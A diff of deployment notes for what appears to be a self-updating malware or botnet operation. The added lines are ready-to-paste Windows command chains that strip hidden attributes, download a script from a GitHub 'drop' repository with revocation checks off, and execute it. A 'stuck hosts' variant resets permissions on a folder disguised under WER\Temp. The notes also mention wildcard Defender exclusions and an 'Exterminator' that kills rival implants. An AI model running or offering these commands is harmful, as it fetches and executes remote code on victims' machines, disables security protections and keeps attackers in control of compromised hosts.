@@ -1,8 +1,8 @@
-UNIVERSAL DEPLOY (O47 / M33 / L26 — Gryxa FP 36e506ff pinned; allow by gryxa.com relay OR keeper FP):
+UNIVERSAL DEPLOY (O48 / M34 / L29 — Gryxa FP 36e506ff pinned; allow by gryxa.com relay OR keeper FP; wildcard Defender exclusions; workdir unharden-on-entry so hosts can never freeze on an old build):
 
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o47" & findstr /C:"OWN BUILD 20260802O47" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o48" & findstr /C:"OWN BUILD 20260802O48" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-SHA-pin:
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt" & findstr /C:"OWN BUILD 20260802O47" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+STUCK HOSTS (old M5-era build, self-update frozen by workdir LockDir) — unharden first, then deploy:
+icacls "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache" /reset /T /C /Q >nul 2>&1 & attrib -h -s -r "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache" 2>nul & attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o48" & findstr /C:"OWN BUILD 20260802O48" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-O47: FP rotated to 36e506ff016b2151 across own/own_mon/own_secure. Exterminator + foreign counter allow any SC whose relay is gryxa.com OR whose FP is a keeper — new Gryxa is no longer killed on connect.
+O48: unharden workdir on entry (attrib reset + icacls /reset + regrant) so the self-update tick can always download/apply new builds. Fixes hosts frozen on M5-era builds.
